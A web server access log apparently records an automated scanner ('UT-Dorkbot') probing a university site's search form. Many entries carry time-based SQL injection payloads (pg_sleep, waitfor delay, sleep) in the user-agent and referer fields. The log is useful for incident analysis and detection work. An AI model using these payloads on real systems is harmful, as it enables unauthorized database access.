timestamp,remote_addr,request_method,request,response_status,body_bytes_sent,request_time,host,upstream_status,upstream_response_time,upstream_cache_status,http_x_forwarded_for,http_referrer,http_user_agent
2026-07-08T05:37:45+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?st=40&type_id=229&text_name= HTTP/2.0,200,3245,0.08,personweb.kku.ac.th,200,0.080,MISS,,,UT-Dorkbot/1.3');select pg_sleep(4); -- 
2026-07-08T05:37:46+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?text_name=&type_id=229&st=40 HTTP/2.0,200,3245,0.239,personweb.kku.ac.th,200,0.238,MISS,,,UT-Dorkbot/1.3));select pg_sleep(4); -- 
2026-07-08T05:37:47+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?type_id=229&st=40&text_name= HTTP/2.0,200,3245,0.073,personweb.kku.ac.th,200,0.073,MISS,,,UT-Dorkbot/1.3'));select pg_sleep(4); -- 
2026-07-08T05:37:48+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?st=40&type_id=229&text_name= HTTP/2.0,200,3245,0.07,personweb.kku.ac.th,200,0.070,MISS,,,UT-Dorkbot/1.3;waitfor delay '0:0:4'-- 
2026-07-08T05:37:49+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?text_name=&st=40&type_id=229 HTTP/2.0,200,3245,0.239,personweb.kku.ac.th,200,0.239,MISS,,,UT-Dorkbot/1.3';waitfor delay '0:0:4'-- 
2026-07-08T05:37:51+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?text_name=&st=40&type_id=229 HTTP/2.0,200,3245,1.293,personweb.kku.ac.th,200,1.293,MISS,,,"UT-Dorkbot/1.3"";waitfor delay '0:0:4'-- "
2026-07-08T05:37:52+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?st=40&text_name=&type_id=229 HTTP/2.0,200,3245,0.086,personweb.kku.ac.th,200,0.086,MISS,,,UT-Dorkbot/1.3);waitfor delay '0:0:4'-- 
2026-07-08T05:37:53+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?st=40&text_name=&type_id=229 HTTP/2.0,200,3245,0.017,personweb.kku.ac.th,200,0.017,MISS,,,UT-Dorkbot/1.3');waitfor delay '0:0:4'-- 
2026-07-08T05:37:55+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?type_id=229&text_name=&st=40 HTTP/2.0,200,3245,1.426,personweb.kku.ac.th,200,1.426,MISS,,,"UT-Dorkbot/1.3"");waitfor delay '0:0:4'-- "
2026-07-08T05:37:57+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?st=40&type_id=229&text_name= HTTP/2.0,200,3245,1.588,personweb.kku.ac.th,200,1.587,MISS,,,UT-Dorkbot/1.3));waitfor delay '0:0:4'-- 
2026-07-08T05:37:58+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?st=40&type_id=229&text_name= HTTP/2.0,200,3245,0.38,personweb.kku.ac.th,200,0.380,MISS,,,UT-Dorkbot/1.3'));waitfor delay '0:0:4'-- 
2026-07-08T05:37:58+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?type_id=229&text_name=&st=40 HTTP/2.0,200,3245,0.239,personweb.kku.ac.th,200,0.239,MISS,,,"UT-Dorkbot/1.3""));waitfor delay '0:0:4'-- "
2026-07-08T05:37:59+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?type_id=229&st=40&text_name= HTTP/2.0,200,3245,0.017,personweb.kku.ac.th,200,0.018,MISS,,https://personweb.kku.ac.th/e-administration/SearchForm.php?st=40&type_id=229&text_name= and sleep(4),UT-Dorkbot/1.3
2026-07-08T05:38:00+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?st=40&type_id=229&text_name= HTTP/2.0,200,3245,0.077,personweb.kku.ac.th,200,0.077,MISS,,https://personweb.kku.ac.th/e-administration/SearchForm.php?st=40&type_id=229&text_name= or sleep(4) # ,UT-Dorkbot/1.3
2026-07-08T05:38:01+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?text_name=&st=40&type_id=229 HTTP/2.0,200,3245,0.234,personweb.kku.ac.th,200,0.234,MISS,,https://personweb.kku.ac.th/e-administration/SearchForm.php?st=40&type_id=229&text_name=' and sleep(4)=',UT-Dorkbot/1.3
2026-07-08T05:38:04+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?st=40&text_name=&type_id=229 HTTP/2.0,200,3245,1.431,personweb.kku.ac.th,200,1.431,MISS,,https://personweb.kku.ac.th/e-administration/SearchForm.php?st=40&type_id=229&text_name=' and sleep(4) # ,UT-Dorkbot/1.3
2026-07-08T05:38:05+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?st=40&type_id=229&text_name= HTTP/2.0,200,3245,1.017,personweb.kku.ac.th,200,1.017,MISS,,"https://personweb.kku.ac.th/e-administration/SearchForm.php?st=40&type_id=229&text_name="" and sleep(4)=""",UT-Dorkbot/1.3
2026-07-08T05:38:05+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?type_id=229&text_name=&st=40 HTTP/2.0,200,3245,0.019,personweb.kku.ac.th,200,0.019,MISS,,https://personweb.kku.ac.th/e-administration/SearchForm.php?st=40&type_id=229&text_name=' or sleep(4) # ,UT-Dorkbot/1.3
2026-07-08T05:38:08+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?text_name=&st=40&type_id=229 HTTP/2.0,200,3245,1.229,personweb.kku.ac.th,200,1.228,MISS,,"https://personweb.kku.ac.th/e-administration/SearchForm.php?st=40&type_id=229&text_name="" or sleep(4) # ",UT-Dorkbot/1.3
2026-07-08T05:38:08+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?text_name=&st=40&type_id=229 HTTP/2.0,200,3245,0.076,personweb.kku.ac.th,200,0.076,MISS,,https://personweb.kku.ac.th/e-administration/SearchForm.php?st=40&type_id=229&text_name='=sleep(4)=',UT-Dorkbot/1.3
2026-07-08T05:38:09+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?text_name=&type_id=229&st=40 HTTP/2.0,200,3245,0.376,personweb.kku.ac.th,200,0.376,MISS,,"https://personweb.kku.ac.th/e-administration/SearchForm.php?st=40&type_id=229&text_name=""=sleep(4)=""",UT-Dorkbot/1.3
2026-07-08T05:38:11+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?text_name=&st=40&type_id=229 HTTP/2.0,200,3245,1.425,personweb.kku.ac.th,200,1.425,MISS,,https://personweb.kku.ac.th/e-administration/SearchForm.php?st=40&type_id=229&text_name=' where sleep(4) # ,UT-Dorkbot/1.3
2026-07-08T05:38:13+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?text_name=&type_id=229&st=40 HTTP/2.0,200,3245,1.021,personweb.kku.ac.th,200,1.020,MISS,,https://personweb.kku.ac.th/e-administration/SearchForm.php?st=40&type_id=229&text_name=;select pg_sleep(4); -- ,UT-Dorkbot/1.3
2026-07-08T05:38:13+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?type_id=229&text_name=&st=40 HTTP/2.0,200,3245,0.072,personweb.kku.ac.th,200,0.072,MISS,,https://personweb.kku.ac.th/e-administration/SearchForm.php?st=40&type_id=229&text_name=';select pg_sleep(4); -- ,UT-Dorkbot/1.3
2026-07-08T05:38:14+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?st=40&type_id=229&text_name= HTTP/2.0,200,3245,0.068,personweb.kku.ac.th,200,0.068,MISS,,https://personweb.kku.ac.th/e-administration/SearchForm.php?st=40&type_id=229&text_name=);select pg_sleep(4); -- ,UT-Dorkbot/1.3
2026-07-08T05:38:15+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?type_id=229&text_name=&st=40 HTTP/2.0,200,3245,0.064,personweb.kku.ac.th,200,0.063,MISS,,https://personweb.kku.ac.th/e-administration/SearchForm.php?st=40&type_id=229&text_name=');select pg_sleep(4); -- ,UT-Dorkbot/1.3
2026-07-08T05:38:17+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?text_name=&type_id=229&st=40 HTTP/2.0,200,3245,1.021,personweb.kku.ac.th,200,1.021,MISS,,https://personweb.kku.ac.th/e-administration/SearchForm.php?st=40&type_id=229&text_name=));select pg_sleep(4); -- ,UT-Dorkbot/1.3
2026-07-08T05:38:18+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?type_id=229&st=40&text_name= HTTP/2.0,200,3245,0.378,personweb.kku.ac.th,200,0.378,MISS,,https://personweb.kku.ac.th/e-administration/SearchForm.php?st=40&type_id=229&text_name='));select pg_sleep(4); -- ,UT-Dorkbot/1.3
2026-07-08T05:38:18+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?st=40&type_id=229&text_name= HTTP/2.0,200,3245,0.069,personweb.kku.ac.th,200,0.069,MISS,,https://personweb.kku.ac.th/e-administration/SearchForm.php?st=40&type_id=229&text_name=;waitfor delay '0:0:4'-- ,UT-Dorkbot/1.3
2026-07-08T05:38:19+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?type_id=229&st=40&text_name= HTTP/2.0,200,3245,0.233,personweb.kku.ac.th,200,0.233,MISS,,https://personweb.kku.ac.th/e-administration/SearchForm.php?st=40&type_id=229&text_name=';waitfor delay '0:0:4'-- ,UT-Dorkbot/1.3
2026-07-08T05:38:22+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?type_id=229&text_name=&st=40 HTTP/2.0,200,3245,1.42,personweb.kku.ac.th,200,1.420,MISS,,"https://personweb.kku.ac.th/e-administration/SearchForm.php?st=40&type_id=229&text_name="";waitfor delay '0:0:4'-- ",UT-Dorkbot/1.3
2026-07-08T05:38:22+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?st=40&type_id=229&text_name= HTTP/2.0,200,3245,0.019,personweb.kku.ac.th,200,0.019,MISS,,https://personweb.kku.ac.th/e-administration/SearchForm.php?st=40&type_id=229&text_name=);waitfor delay '0:0:4'-- ,UT-Dorkbot/1.3
2026-07-08T05:38:23+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?st=40&type_id=229&text_name= HTTP/2.0,200,3245,0.235,personweb.kku.ac.th,200,0.235,MISS,,https://personweb.kku.ac.th/e-administration/SearchForm.php?st=40&type_id=229&text_name=');waitfor delay '0:0:4'-- ,UT-Dorkbot/1.3
2026-07-08T05:38:24+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?st=40&type_id=229&text_name= HTTP/2.0,200,3245,0.081,personweb.kku.ac.th,200,0.081,MISS,,"https://personweb.kku.ac.th/e-administration/SearchForm.php?st=40&type_id=229&text_name="");waitfor delay '0:0:4'-- ",UT-Dorkbot/1.3
2026-07-08T05:38:25+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?st=40&text_name=&type_id=229 HTTP/2.0,200,3245,0.076,personweb.kku.ac.th,200,0.076,MISS,,https://personweb.kku.ac.th/e-administration/SearchForm.php?st=40&type_id=229&text_name=));waitfor delay '0:0:4'-- ,UT-Dorkbot/1.3
2026-07-08T05:38:27+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?text_name=&type_id=229&st=40 HTTP/2.0,200,3245,1.22,personweb.kku.ac.th,200,1.220,MISS,,https://personweb.kku.ac.th/e-administration/SearchForm.php?st=40&type_id=229&text_name='));waitfor delay '0:0:4'-- ,UT-Dorkbot/1.3
2026-07-08T05:38:28+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?type_id=229&text_name=&st=40 HTTP/2.0,200,3245,0.017,personweb.kku.ac.th,200,0.017,MISS,,"https://personweb.kku.ac.th/e-administration/SearchForm.php?st=40&type_id=229&text_name=""));waitfor delay '0:0:4'-- ",UT-Dorkbot/1.3
2026-07-08T05:38:29+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?text_name=&type_id=229&st=40 HTTP/2.0,200,3245,0.085,personweb.kku.ac.th,200,0.085,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:38:30+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?type_id=229&text_name=&st=40 HTTP/2.0,200,3245,0.081,personweb.kku.ac.th,200,0.080,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:38:32+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?type_id=229&st=40&text_name= HTTP/2.0,200,3245,1.621,personweb.kku.ac.th,200,1.622,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:38:32+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?type_id=229&st=40&text_name= HTTP/2.0,200,3245,0.017,personweb.kku.ac.th,200,0.017,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:38:34+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?st=40&text_name=&type_id=229 HTTP/2.0,200,3245,0.082,personweb.kku.ac.th,200,0.082,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:38:35+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?text_name=&st=40&type_id=229 HTTP/2.0,200,3245,0.077,personweb.kku.ac.th,200,0.078,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:38:37+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?st=40&type_id=229&text_name= HTTP/2.0,200,3245,1.425,personweb.kku.ac.th,200,1.426,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:38:37+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?type_id=229&st=40&text_name= HTTP/2.0,200,3245,0.23,personweb.kku.ac.th,200,0.230,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:38:38+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?st=40&type_id=229&text_name= HTTP/2.0,200,3245,0.07,personweb.kku.ac.th,200,0.070,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:38:39+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?type_id=229&st=40&text_name= HTTP/2.0,200,3245,0.082,personweb.kku.ac.th,200,0.082,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:38:40+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?type_id=229&st=40&text_name= HTTP/2.0,200,3245,0.025,personweb.kku.ac.th,200,0.025,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:38:41+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?st=40&text_name=&type_id=229 HTTP/2.0,200,3245,0.072,personweb.kku.ac.th,200,0.072,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:38:43+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?st=40&type_id=229&text_name= HTTP/2.0,200,3245,0.45,personweb.kku.ac.th,200,0.450,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:38:43+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?st=40&type_id=229&text_name= HTTP/2.0,200,3245,0.066,personweb.kku.ac.th,200,0.066,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:38:44+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?text_name=&st=40&type_id=229 HTTP/2.0,200,3245,0.077,personweb.kku.ac.th,200,0.077,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:38:45+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?st=40&text_name=&type_id=229 HTTP/2.0,200,3245,0.074,personweb.kku.ac.th,200,0.074,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:38:46+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?text_name=&st=40&type_id=229 HTTP/2.0,200,3245,0.238,personweb.kku.ac.th,200,0.237,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:38:49+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?st=40&text_name=&type_id=229 HTTP/2.0,200,3245,1.635,personweb.kku.ac.th,200,1.635,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:38:49+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?type_id=229&text_name=&st=40 HTTP/2.0,200,3245,0.075,personweb.kku.ac.th,200,0.075,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:38:50+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?st=40&text_name=&type_id=229 HTTP/2.0,200,3245,0.087,personweb.kku.ac.th,200,0.087,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:38:52+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?text_name=&type_id=229&st=40 HTTP/2.0,200,3245,1.221,personweb.kku.ac.th,200,1.220,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:38:53+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?st=40&type_id=229&text_name= HTTP/2.0,200,3245,0.236,personweb.kku.ac.th,200,0.236,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:38:55+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?st=40&type_id=229&text_name= HTTP/2.0,200,3245,1.426,personweb.kku.ac.th,200,1.426,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:38:56+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?st=40&text_name=&type_id=229 HTTP/2.0,200,3245,0.103,personweb.kku.ac.th,200,0.103,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:38:56+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?st=40&type_id=229&text_name= HTTP/2.0,200,3245,0.024,personweb.kku.ac.th,200,0.023,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:38:57+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?type_id=229&text_name=&st=40 HTTP/2.0,200,3245,0.017,personweb.kku.ac.th,200,0.017,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:38:59+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?st=40&text_name=&type_id=229 HTTP/2.0,200,3245,0.375,personweb.kku.ac.th,200,0.375,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:38:59+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?st=40&text_name=&type_id=229 HTTP/2.0,200,3245,0.016,personweb.kku.ac.th,200,0.016,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:39:01+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?st=40&text_name=&type_id=229 HTTP/2.0,200,3245,0.078,personweb.kku.ac.th,200,0.078,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:39:02+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?type_id=229&st=40&text_name= HTTP/2.0,200,3245,0.073,personweb.kku.ac.th,200,0.074,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:39:03+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?type_id=229&text_name=&st=40 HTTP/2.0,200,3245,0.019,personweb.kku.ac.th,200,0.019,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:39:04+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?type_id=229&text_name=&st=40 HTTP/2.0,200,3245,0.018,personweb.kku.ac.th,200,0.017,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:39:05+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?st=40&text_name=&type_id=229 HTTP/2.0,200,3245,0.076,personweb.kku.ac.th,200,0.076,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:39:06+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?st=40&text_name=&type_id=229 HTTP/2.0,200,3245,0.072,personweb.kku.ac.th,200,0.072,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:39:07+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?text_name=&st=40&type_id=229 HTTP/2.0,200,3245,0.016,personweb.kku.ac.th,200,0.016,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:39:08+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?type_id=229&st=40&text_name= HTTP/2.0,200,3245,0.541,personweb.kku.ac.th,200,0.541,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:39:09+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?st=40&type_id=229&text_name= HTTP/2.0,200,3245,0.227,personweb.kku.ac.th,200,0.227,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:39:10+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?st=40&type_id=229&text_name= HTTP/2.0,200,3245,0.073,personweb.kku.ac.th,200,0.072,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:39:11+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?type_id=229&text_name=&st=40 HTTP/2.0,200,3245,0.019,personweb.kku.ac.th,200,0.019,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:39:12+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?text_name=&type_id=229&st=40 HTTP/2.0,200,3245,0.323,personweb.kku.ac.th,200,0.323,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:39:13+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?type_id=229&text_name=&st=40 HTTP/2.0,200,3245,0.019,personweb.kku.ac.th,200,0.019,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:39:14+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?st=40&text_name=&type_id=229 HTTP/2.0,200,3245,0.027,personweb.kku.ac.th,200,0.027,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:39:15+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?text_name=&st=40&type_id=229 HTTP/2.0,200,3245,0.373,personweb.kku.ac.th,200,0.373,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:39:16+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?type_id=229&text_name=&st=40 HTTP/2.0,200,3245,0.233,personweb.kku.ac.th,200,0.233,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:39:17+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?text_name=&type_id=229&st=40 HTTP/2.0,200,3245,0.076,personweb.kku.ac.th,200,0.076,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:39:18+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?st=40&type_id=229&text_name= HTTP/2.0,200,3245,0.027,personweb.kku.ac.th,200,0.026,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:39:20+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?type_id=229&text_name=&st=40 HTTP/2.0,200,3245,1.466,personweb.kku.ac.th,200,1.465,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:39:20+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?st=40&type_id=229&text_name= HTTP/2.0,200,3245,0.017,personweb.kku.ac.th,200,0.017,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:39:23+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?text_name=&st=40&type_id=229 HTTP/2.0,200,3245,1.836,personweb.kku.ac.th,200,1.835,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:39:24+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?text_name=&st=40&type_id=229 HTTP/2.0,200,3245,0.328,personweb.kku.ac.th,200,0.327,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:39:25+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?type_id=229&text_name=&st=40 HTTP/2.0,200,3245,0.081,personweb.kku.ac.th,200,0.081,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:39:26+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?text_name=&st=40&type_id=229 HTTP/2.0,200,3245,0.077,personweb.kku.ac.th,200,0.077,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:39:28+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?text_name=&st=40&type_id=229 HTTP/2.0,200,3245,1.62,personweb.kku.ac.th,200,1.619,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:39:29+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?text_name=&st=40&type_id=229 HTTP/2.0,200,3245,0.234,personweb.kku.ac.th,200,0.234,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:39:29+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?type_id=229&text_name=&st=40 HTTP/2.0,200,3245,0.065,personweb.kku.ac.th,200,0.064,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:39:31+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?st=40&type_id=229&text_name= HTTP/2.0,200,3245,0.226,personweb.kku.ac.th,200,0.225,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:39:33+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?st=40&text_name=&type_id=229 HTTP/2.0,200,3245,1.221,personweb.kku.ac.th,200,1.222,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:39:33+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?type_id=229&st=40&text_name= HTTP/2.0,200,3245,0.075,personweb.kku.ac.th,200,0.075,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:39:34+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?type_id=229&text_name=&st=40 HTTP/2.0,200,3245,0.019,personweb.kku.ac.th,200,0.018,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:39:36+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?text_name=&st=40&type_id=229 HTTP/2.0,200,3245,1.018,personweb.kku.ac.th,200,1.018,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:39:36+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?text_name=&st=40&type_id=229 HTTP/2.0,200,3245,0.07,personweb.kku.ac.th,200,0.070,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:39:38+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?st=40&text_name=&type_id=229 HTTP/2.0,200,3245,0.235,personweb.kku.ac.th,200,0.235,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:39:38+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?text_name=&type_id=229&st=40 HTTP/2.0,200,3245,0.026,personweb.kku.ac.th,200,0.026,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:39:39+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?st=40&text_name=&type_id=229 HTTP/2.0,200,3245,0.073,personweb.kku.ac.th,200,0.073,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:39:40+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?st=40&type_id=229&text_name= HTTP/2.0,200,3245,0.07,personweb.kku.ac.th,200,0.070,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:39:41+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?text_name=&st=40&type_id=229 HTTP/2.0,200,3245,0.025,personweb.kku.ac.th,200,0.026,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:39:44+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?type_id=229&text_name=&st=40 HTTP/2.0,200,3245,1.224,personweb.kku.ac.th,200,1.225,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:39:44+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?type_id=229&st=40&text_name= HTTP/2.0,200,3245,0.091,personweb.kku.ac.th,200,0.091,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:39:45+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?type_id=229&st=40&text_name= HTTP/2.0,200,3245,0.072,personweb.kku.ac.th,200,0.072,MISS,,,UT-Dorkbot/1.3
2026-07-08T05:39:46+07:00,146.6.161.97,GET,GET /e-administration/SearchForm.php?text_name=&st=40&type_id=229 HTTP/2.0,200,3245,0.233,personweb.kku.ac.th,200,0.233,MISS,,,UT-Dorkbot/1.3
